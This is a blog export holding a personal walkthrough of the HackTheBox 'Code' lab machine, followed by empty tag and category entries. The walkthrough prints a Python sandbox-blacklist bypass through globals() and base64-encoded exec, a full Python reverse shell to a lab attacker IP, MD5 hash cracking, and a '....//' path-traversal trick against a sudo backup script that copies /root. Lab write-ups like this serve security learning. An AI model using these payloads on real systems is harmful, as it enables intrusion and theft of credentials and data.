
[{"content":"Welcome to my first HTB writeup/walkthrough. Having just received a new keyboard from my wonderful partner, I\u0026rsquo;ve gained the drive to finally start posting writeups as I learn offsec with HTB.\nHave you ever thought you knew something then experienced something that made you think nevermind? Well that was me with Code. Having used Python extensively in college, I thought I was pretty decent\u0026ndash;at least not a novice. But well\u0026hellip; let\u0026rsquo;s just say I got put back in my place.\nAnyways, let\u0026rsquo;s just get started.\nRecon # We begin with a basic Nmap scan.\n┌──(kali㉿kali)-[~] └─$ nmap -sCV 10.10.11.62 Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-31 01:06 EDT Nmap scan report for 10.10.11.62 Host is up (0.019s latency). Not shown: 998 closed tcp ports (reset) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 b5:b9:7c:c4:50:32:95:bc:c2:65:17:df:51:a2:7a:bd (RSA) | 256 94:b5:25:54:9b:68:af:be:40:e1:1d:a8:6b:85:0d:01 (ECDSA) |_ 256 12:8c:dc:97:ad:86:00:b4:88:e2:29:cf:69:b5:65:96 (ED25519) 5000/tcp open http Gunicorn 20.0.4 |_http-server-header: gunicorn/20.0.4 |_http-title: Python Code Editor Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 7.67 seconds Looks like theres an SSH and HTTP service running. The SSH service is usually not vulnerable with HTB, so we can enumerate the HTTP service first.\nWeb Enumeration # First we add the host to our /etc/hosts file\n┌──(kali㉿kali)-[~] └─$ echo \u0026#39;10.10.11.62 code.htb\u0026#39; | sudo tee -a /etc/hosts 10.10.11.62 code.htb Navigating to the webpage on port 5000, we see some sort of web-based code runner. There doesn\u0026rsquo;t seem to be more to this site. There are Register, Login, and About links, but no useful information is found. You can also try directory/vhost fuzzing, but I didn\u0026rsquo;t find anything particularly interesting.\nFoothold # Blacklist Bypass # If our python code is running, we can try directly popping a reverse shell. However, playing around with some python leads to some issues\u0026hellip; There seems to be some kind of filter. After some testing, we can determine the filter to be a blacklist on the entire input string.\nAs you can see, \u0026ldquo;os\u0026rdquo; is filtered despite only being called in a print statement. I believe this filter is probably only being run on the user input on the web back-end. We can test this theory by trying to print \u0026ldquo;os\u0026rdquo; without directly having the string \u0026ldquo;os\u0026rdquo; sent though the webapp.\nEzpz. We\u0026rsquo;ve proven that we can bypass the web filter while running \u0026ldquo;malicious\u0026rdquo; code. Now we have to somehow come up with bypassable code that runs a reverse shell.\nPopping The Shell # We know that we can bypass the filter using string concatenation, so let\u0026rsquo;s figure out how to call python functions with string literals.\nThe question we must ask ourselves is: how are functions called in python?. If we were to look at a compiled language like C, the compiler creates a data structure called the Symbol Table. Python also has a symbol table that gets created during bytecode compilation; however, it also has dynamic structures called namespaces that get created at runtime.\nWe can use these namespaces to see what global/built-in functions are available, then call them with string literals.\nIf we look at the normal built-in functions, we can see some useful modules and functions.\n┌──(kali㉿kali)-[~] └─$ python -c \u0026#34;print(dir(__builtins__))\u0026#34; [\u0026#39;ArithmeticError\u0026#39;, \u0026#39;AssertionError\u0026#39;, \u0026#39;AttributeError\u0026#39;, \u0026#39;BaseException\u0026#39;, \u0026#39;BaseExceptionGroup\u0026#39;, \u0026#39;BlockingIOError\u0026#39;, \u0026#39;BrokenPipeError\u0026#39;, \u0026#39;BufferError\u0026#39;, \u0026#39;BytesWarning\u0026#39;, \u0026#39;ChildProcessError\u0026#39;, \u0026#39;ConnectionAbortedError\u0026#39;, \u0026#39;ConnectionError\u0026#39;, \u0026#39;ConnectionRefusedError\u0026#39;, \u0026#39;ConnectionResetError\u0026#39;, \u0026#39;DeprecationWarning\u0026#39;, \u0026#39;EOFError\u0026#39;, \u0026#39;Ellipsis\u0026#39;, \u0026#39;EncodingWarning\u0026#39;, \u0026#39;EnvironmentError\u0026#39;, \u0026#39;Exception\u0026#39;, \u0026#39;ExceptionGroup\u0026#39;, \u0026#39;False\u0026#39;, \u0026#39;FileExistsError\u0026#39;, \u0026#39;FileNotFoundError\u0026#39;, \u0026#39;FloatingPointError\u0026#39;, \u0026#39;FutureWarning\u0026#39;, \u0026#39;GeneratorExit\u0026#39;, \u0026#39;IOError\u0026#39;, \u0026#39;ImportError\u0026#39;, \u0026#39;ImportWarning\u0026#39;, \u0026#39;IndentationError\u0026#39;, \u0026#39;IndexError\u0026#39;, \u0026#39;InterruptedError\u0026#39;, \u0026#39;IsADirectoryError\u0026#39;, \u0026#39;KeyError\u0026#39;, \u0026#39;KeyboardInterrupt\u0026#39;, \u0026#39;LookupError\u0026#39;, \u0026#39;MemoryError\u0026#39;, \u0026#39;ModuleNotFoundError\u0026#39;, \u0026#39;NameError\u0026#39;, \u0026#39;None\u0026#39;, \u0026#39;NotADirectoryError\u0026#39;, \u0026#39;NotImplemented\u0026#39;, \u0026#39;NotImplementedError\u0026#39;, \u0026#39;OSError\u0026#39;, \u0026#39;OverflowError\u0026#39;, \u0026#39;PendingDeprecationWarning\u0026#39;, \u0026#39;PermissionError\u0026#39;, \u0026#39;ProcessLookupError\u0026#39;, \u0026#39;PythonFinalizationError\u0026#39;, \u0026#39;RecursionError\u0026#39;, \u0026#39;ReferenceError\u0026#39;, \u0026#39;ResourceWarning\u0026#39;, \u0026#39;RuntimeError\u0026#39;, \u0026#39;RuntimeWarning\u0026#39;, \u0026#39;StopAsyncIteration\u0026#39;, \u0026#39;StopIteration\u0026#39;, \u0026#39;SyntaxError\u0026#39;, \u0026#39;SyntaxWarning\u0026#39;, \u0026#39;SystemError\u0026#39;, \u0026#39;SystemExit\u0026#39;, \u0026#39;TabError\u0026#39;, \u0026#39;TimeoutError\u0026#39;, \u0026#39;True\u0026#39;, \u0026#39;TypeError\u0026#39;, \u0026#39;UnboundLocalError\u0026#39;, \u0026#39;UnicodeDecodeError\u0026#39;, \u0026#39;UnicodeEncodeError\u0026#39;, \u0026#39;UnicodeError\u0026#39;, \u0026#39;UnicodeTranslateError\u0026#39;, \u0026#39;UnicodeWarning\u0026#39;, \u0026#39;UserWarning\u0026#39;, \u0026#39;ValueError\u0026#39;, \u0026#39;Warning\u0026#39;, \u0026#39;ZeroDivisionError\u0026#39;, \u0026#39;_IncompleteInputError\u0026#39;, \u0026#39;__build_class__\u0026#39;, \u0026#39;__debug__\u0026#39;, \u0026#39;__doc__\u0026#39;, \u0026#39;__import__\u0026#39;, \u0026#39;__loader__\u0026#39;, \u0026#39;__name__\u0026#39;, \u0026#39;__package__\u0026#39;, \u0026#39;__spec__\u0026#39;, \u0026#39;abs\u0026#39;, \u0026#39;aiter\u0026#39;, \u0026#39;all\u0026#39;, \u0026#39;anext\u0026#39;, \u0026#39;any\u0026#39;, \u0026#39;ascii\u0026#39;, \u0026#39;bin\u0026#39;, \u0026#39;bool\u0026#39;, \u0026#39;breakpoint\u0026#39;, \u0026#39;bytearray\u0026#39;, \u0026#39;bytes\u0026#39;, \u0026#39;callable\u0026#39;, \u0026#39;chr\u0026#39;, \u0026#39;classmethod\u0026#39;, \u0026#39;compile\u0026#39;, \u0026#39;complex\u0026#39;, \u0026#39;copyright\u0026#39;, \u0026#39;credits\u0026#39;, \u0026#39;delattr\u0026#39;, \u0026#39;dict\u0026#39;, \u0026#39;dir\u0026#39;, \u0026#39;divmod\u0026#39;, \u0026#39;enumerate\u0026#39;, \u0026#39;eval\u0026#39;, \u0026#39;exec\u0026#39;, \u0026#39;exit\u0026#39;, \u0026#39;filter\u0026#39;, \u0026#39;float\u0026#39;, \u0026#39;format\u0026#39;, \u0026#39;frozenset\u0026#39;, \u0026#39;getattr\u0026#39;, \u0026#39;globals\u0026#39;, \u0026#39;hasattr\u0026#39;, \u0026#39;hash\u0026#39;, \u0026#39;help\u0026#39;, \u0026#39;hex\u0026#39;, \u0026#39;id\u0026#39;, \u0026#39;input\u0026#39;, \u0026#39;int\u0026#39;, \u0026#39;isinstance\u0026#39;, \u0026#39;issubclass\u0026#39;, \u0026#39;iter\u0026#39;, \u0026#39;len\u0026#39;, \u0026#39;license\u0026#39;, \u0026#39;list\u0026#39;, \u0026#39;locals\u0026#39;, \u0026#39;map\u0026#39;, \u0026#39;max\u0026#39;, \u0026#39;memoryview\u0026#39;, \u0026#39;min\u0026#39;, \u0026#39;next\u0026#39;, \u0026#39;object\u0026#39;, \u0026#39;oct\u0026#39;, \u0026#39;open\u0026#39;, \u0026#39;ord\u0026#39;, \u0026#39;pow\u0026#39;, \u0026#39;print\u0026#39;, \u0026#39;property\u0026#39;, \u0026#39;quit\u0026#39;, \u0026#39;range\u0026#39;, \u0026#39;repr\u0026#39;, \u0026#39;reversed\u0026#39;, \u0026#39;round\u0026#39;, \u0026#39;set\u0026#39;, \u0026#39;setattr\u0026#39;, \u0026#39;slice\u0026#39;, \u0026#39;sorted\u0026#39;, \u0026#39;staticmethod\u0026#39;, \u0026#39;str\u0026#39;, \u0026#39;sum\u0026#39;, \u0026#39;super\u0026#39;, \u0026#39;tuple\u0026#39;, \u0026#39;type\u0026#39;, \u0026#39;vars\u0026#39;, \u0026#39;zip\u0026#39;] If you look closely the blacklisted \u0026ldquo;exec\u0026rdquo; and \u0026ldquo;import\u0026rdquo; are built-in. If we can somehow gain access to the builtins object, we could call them; however, \u0026ldquo;builtins\u0026rdquo; is also blacklisted.\nLuckily, the globals namespace gives us access to a dictionary that maps names to global objects.\n┌──(kali㉿kali)-[~] └─$ python -c \u0026#34;print(globals())\u0026#34; {\u0026#39;__name__\u0026#39;: \u0026#39;__main__\u0026#39;, \u0026#39;__doc__\u0026#39;: None, \u0026#39;__package__\u0026#39;: None, \u0026#39;__loader__\u0026#39;: \u0026lt;class \u0026#39;_frozen_importlib.BuiltinImporter\u0026#39;\u0026gt;, \u0026#39;__spec__\u0026#39;: None, \u0026#39;__annotations__\u0026#39;: {}, \u0026#39;__builtins__\u0026#39;: \u0026lt;module \u0026#39;builtins\u0026#39; (built-in)\u0026gt;} Would you look at that, globals maps a string key to the builtins object, so we can call it with a concatenated string!\nOh, did I mention \u0026ldquo;globals\u0026rdquo; isn\u0026rsquo;t blacklisted :)? I guess the lesson is, if you are going ot make a blacklist, you better make sure you blacklist everything. Better yet, just do something other than a blacklist -_-.\nWith access to builtin functions, let\u0026rsquo;s just try calling exec to see what happens.\nRuh-roh, looks like I can call exec on python code as a string! Now all we have to do is create python code that doesn\u0026rsquo;t directly have blacklisted terms. This can be easily accomplished by base64 encoding some python code, then passing the decoded string to exec.\nLet\u0026rsquo;s encode a python reverse shell into base64\n┌──(kali㉿kali)-[~] └─$ echo -n \u0026#39;import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\u0026#34;10.10.14.2\u0026#34;,4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\u0026#34;/bin/sh\u0026#34;)\u0026#39; | base64 -w 0 aW1wb3J0IHNvY2tldCxvcyxwdHk7cz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSk7cy5jb25uZWN0KCgiMTAuMTAuMTQuMiIsNDQ0NCkpO29zLmR1cDIocy5maWxlbm8oKSwwKTtvcy5kdXAyKHMuZmlsZW5vKCksMSk7b3MuZHVwMihzLmZpbGVubygpLDIpO3B0eS5zcGF3bigiL2Jpbi9zaCIp And have ChatGPT generate some base64 decoding code and we have:\nex = globals()[\u0026#34;__buil\u0026#34;+\u0026#34;tins__\u0026#34;][\u0026#34;exe\u0026#34;+\u0026#34;c\u0026#34;] # Base64 decoding table # Function to decode base64 without def base64_decode(encoded_str): base64_chars = \u0026#34;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\u0026#34; padding = \u0026#34;=\u0026#34; # Create a dictionary for base64 characters base64_map = {base64_chars[i]: i for i in range(64)} # Remove padding encoded_str = encoded_str.rstrip(padding) # Convert the encoded string to binary binary_str = \u0026#34;\u0026#34; for char in encoded_str: binary_str += format(base64_map[char], \u0026#39;06b\u0026#39;) # Group the binary string into 8-bit chunks (bytes) byte_chunks = [binary_str[i:i+8] for i in range(0, len(binary_str), 8)] # Convert binary chunks to characters decoded_bytes = [] for chunk in byte_chunks: decoded_bytes.append(chr(int(chunk, 2))) # Join the decoded characters to form the final decoded string return \u0026#39;\u0026#39;.join(decoded_bytes).replace(\u0026#34;\\x00\u0026#34;,\u0026#34;\u0026#34;) encoded_str = \u0026#39;aW1wb3J0IHNvY2tldCxvcyxwdHk7cz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSk7cy5jb25uZWN0KCgiMTAuMTAuMTQuMiIsNDQ0NCkpO29zLmR1cDIocy5maWxlbm8oKSwwKTtvcy5kdXAyKHMuZmlsZW5vKCksMSk7b3MuZHVwMihzLmZpbGVubygpLDIpO3B0eS5zcGF3bigiL2Jpbi9zaCIp\u0026#39; decoded_str = base64_decode(encoded_str) print(decoded_str) ex(decoded_str) Phew! Finally, we can start a Netcat listener and pop the shell!\n┌──(kali㉿kali)-[~] └─$ nc -lvnp 4444 listening on [any] 4444 ... Shell popped! We are a un-privileged user and the shell dies every 2-ish minutes, but we\u0026rsquo;re in!\nGoing one directory up, we see the user.txt!\n$ cd .. cd .. $ cat user.txt cat user.txt \u0026lt;REDACTED\u0026gt; Privesc to martin # The first thing I saw was that we have access to the app\u0026rsquo;s backend. Usually, I would upgrade my shell, but the connection dies too often for that to matter. The connection also dies too quickly for us to properly do on-net analysis, thus we zip the entire directory and tranfer it to our attack host to take our sweet time.\nYou could implement some persistence measures here, but meh.\n$ pwd pwd /home/app-production/app $ cd .. cd .. $ ls ls app user.txt $ tar -czvf app.tar.gz app tar -czvf app.tar.gz app app/ app/app.py app/static/ app/static/css/ app/static/css/styles.css app/templates/ app/templates/index.html app/templates/codes.html app/templates/register.html app/templates/login.html app/templates/about.html app/__pycache__/ app/__pycache__/app.cpython-38.pyc app/instance/ app/instance/database.db $ ls ls app app.tar.gz user.txt We can transfer the file to our attack host with Netcat.\nWe can then unzip it to inspect.\n┌──(kali㉿kali)-[~] └─$ tar xvf app.tar.gz app/ app/app.py app/static/ app/static/css/ app/static/css/styles.css app/templates/ app/templates/index.html app/templates/codes.html app/templates/register.html app/templates/login.html app/templates/about.html app/__pycache__/ app/__pycache__/app.cpython-38.pyc app/instance/ app/instance/database.db And we find an interesting file.\n┌──(kali㉿kali)-[~/app/instance] └─$ ls database.db ┌──(kali㉿kali)-[~/app/instance] └─$ file database.db database.db: SQLite 3.x database, last written using SQLite version 3031001, file counter 14, database pages 4, cookie 0x2, schema 4, UTF-8, version-valid-for 14 Throwing it into sqlite, we can get creds for the martin user.\n┌──(kali㉿kali)-[~/app/instance] └─$ sqlite3 database.db SQLite version 3.46.1 2024-08-13 09:16:08 Enter \u0026#34;.help\u0026#34; for usage hints. sqlite\u0026gt; .databases main: /home/kali/app/instance/database.db r/w sqlite\u0026gt; .tables code user sqlite\u0026gt; select * from user; 1|development|759b74ce43947f5f4c91aeddc3e5bad3 2|martin|3de6f30c4a09c27fc71932bfc68474be Those look like MD5 hashes. We can throw them into hashcat to get the password.\n┌──(kali㉿kali)-[~/app/instance] └─$ hashcat -m 0 3de6f30c4a09c27fc71932bfc68474be /usr/share/wordlists/rockyou.txt \u0026lt;SNIP\u0026gt; 3de6f30c4a09c27fc71932bfc68474be:nafeelswordsmaster Using this, we can log into the martin user without our shell dying every second :).\n┌──(kali㉿kali)-[~/app/instance] └─$ ssh martin@code.htb \u0026lt;SNIP\u0026gt; martin@code:~$ Privesc to root # While getting the lay of the land, we come accross some sudo permissions.\nmartin@code:~$ sudo -l Matching Defaults entries for martin on localhost: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User martin may run the following commands on localhost: (ALL : ALL) NOPASSWD: /usr/bin/backy.sh This script takes in a json file then removes any ../ with:\nupdated_json=$(/usr/bin/jq \u0026#39;.directories_to_archive |= map(gsub(\u0026#34;\\\\.\\\\./\u0026#34;; \u0026#34;\u0026#34;))\u0026#39; \u0026#34;$json_file\u0026#34;) It also makes sure the backup path starts with either /var/ or /home with:\nallowed_paths=(\u0026#34;/var/\u0026#34; \u0026#34;/home/\u0026#34;) \u0026lt;SNIP\u0026gt; is_allowed_path() { local path=\u0026#34;$1\u0026#34; for allowed_path in \u0026#34;${allowed_paths[@]}\u0026#34;; do if [[ \u0026#34;$path\u0026#34; == $allowed_path* ]]; then return 0 fi done return 1 } for dir in $directories_to_archive; do if ! is_allowed_path \u0026#34;$dir\u0026#34;; then /usr/bin/echo \u0026#34;Error: $dir is not allowed. Only directories under /var/ and /home/ are allowed.\u0026#34; exit 1 fi done BOTH of these security measures are weak to exploitation!\nFor the path traversal prevention, we can simply extend ../ to ....// so that when ../ is replaced, it still leaves behind a ../. I guess next time they should have looped until none were left ;).\nWith directory traversal, we can have our path start with either /var/ or /home/, then traverse to any location we want. This means we can bakup /root!\nOur home folder conveniently has a task.json read for modifying!\nmartin@code:~/backups$ cat task.json { \u0026#34;destination\u0026#34;: \u0026#34;/home/martin/backups/\u0026#34;, \u0026#34;multiprocessing\u0026#34;: true, \u0026#34;verbose_log\u0026#34;: false, \u0026#34;directories_to_archive\u0026#34;: [ \u0026#34;/home/app-production/app\u0026#34; ], \u0026#34;exclude\u0026#34;: [ \u0026#34;.*\u0026#34; ] } We can copy this file and modify the directories_to_archive field to backup the root directory! Make sure to remove the exclude field as well, or nothing will be archived.\nmartin@code:~/backups$ cat my_task.json { \u0026#34;destination\u0026#34;: \u0026#34;/home/martin/backups/\u0026#34;, \u0026#34;multiprocessing\u0026#34;: true, \u0026#34;verbose_log\u0026#34;: false, \u0026#34;directories_to_archive\u0026#34;: [ \u0026#34;/var/....//root/\u0026#34; ] } Now\u0026hellip; exploit!\nmartin@code:~/backups$ sudo /usr/bin/backy.sh my_task.json 2025/08/31 07:09:34 🍀 backy 1.2 2025/08/31 07:09:34 📋 Working with my_task.json ... 2025/08/31 07:09:34 💤 Nothing to sync 2025/08/31 07:09:34 📤 Archiving: [/var/../root] 2025/08/31 07:09:34 📥 To: /home/martin/backups ... 2025/08/31 07:09:34 📦 martin@code:~/backups$ ls code_home_app-production_app_2024_August.tar.bz2 code_var_.._root_2025_August.tar.bz2 my_task.json task.json I ended up moving my tar to the home directory because it kept getting deleted (not sure if it was by other players, or by some scripts). But we can unzip the bz archive to get our flag!\nmartin@code:~$ tar xjvf code_var_.._root_2025_August.tar.bz2 root/ root/.local/ root/.local/share/ root/.local/share/nano/ root/.local/share/nano/search_history root/.selected_editor root/.sqlite_history root/.profile root/scripts/ root/scripts/cleanup.sh root/scripts/backups/ root/scripts/backups/task.json root/scripts/backups/code_home_app-production_app_2024_August.tar.bz2 root/scripts/database.db root/scripts/cleanup2.sh root/.python_history root/root.txt root/.cache/ root/.cache/motd.legal-displayed root/.ssh/ root/.ssh/id_rsa root/.ssh/authorized_keys root/.bash_history root/.bashrc martin@code:~$ ls backups code_var_.._root_2025_August.tar.bz2 root martin@code:~$ cd root martin@code:~/root$ ls root.txt scripts martin@code:~/root$ cat root.txt \u0026lt;REDACTED\u0026gt; Conclusion # This box was overall very fun and well made. I had to learn a lot about the inner-workings of the Python programming language and realized there was so much more to know about it (as it is with everything). There were probably 100\u0026rsquo;s of better ways to exploit the web filter, but I hacked what I could together and got it done. The privesc was easy, but honestly it was welcomed after I spent so much time figuring out the foothold.\nThank you for reading. Hopefully you learned something. If there were any spelling errors, ramblings, etc. I blame myself for doing this so late at night. Till next time!\n","date":"31 August 2025","externalUrl":null,"permalink":"/crocpit/hackthebox/code/","section":"Hacktheboxes","summary":"","title":"[Easy] HTB Code Writeup","type":"hackthebox"},{"content":"","date":"31 August 2025","externalUrl":null,"permalink":"/crocpit/categories/","section":"Categories","summary":"","title":"Categories","type":"categories"},{"content":"","date":"31 August 2025","externalUrl":null,"permalink":"/crocpit/","section":"Crocpit","summary":"","title":"Crocpit","type":"page"},{"content":"","date":"31 August 2025","externalUrl":null,"permalink":"/crocpit/hackthebox/","section":"Hacktheboxes","summary":"","title":"Hacktheboxes","type":"hackthebox"},{"content":"","date":"31 August 2025","externalUrl":null,"permalink":"/crocpit/categories/htb/","section":"Categories","summary":"","title":"HTB","type":"categories"},{"content":"","date":"31 August 2025","externalUrl":null,"permalink":"/crocpit/tags/path-traversal/","section":"Tags","summary":"","title":"Path Traversal","type":"tags"},{"content":"","date":"31 August 2025","externalUrl":null,"permalink":"/crocpit/tags/python/","section":"Tags","summary":"","title":"Python","type":"tags"},{"content":"","date":"31 August 2025","externalUrl":null,"permalink":"/crocpit/tags/","section":"Tags","summary":"","title":"Tags","type":"tags"},{"content":"","date":"31 August 2025","externalUrl":null,"permalink":"/crocpit/tags/web-filter-bypass/","section":"Tags","summary":"","title":"Web Filter Bypass","type":"tags"},{"content":"","externalUrl":null,"permalink":"/crocpit/about/","section":"Crocpit","summary":"","title":"","type":"page"},{"content":"","externalUrl":null,"permalink":"/crocpit/resources/","section":"Crocpit","summary":"","title":"","type":"page"},{"content":"","externalUrl":null,"permalink":"/crocpit/authors/","section":"Authors","summary":"","title":"Authors","type":"authors"},{"content":"","externalUrl":null,"permalink":"/crocpit/tags/easy/","section":"Tags","summary":"","title":"Easy","type":"tags"},{"content":"","externalUrl":null,"permalink":"/crocpit/series/","section":"Series","summary":"","title":"Series","type":"series"}]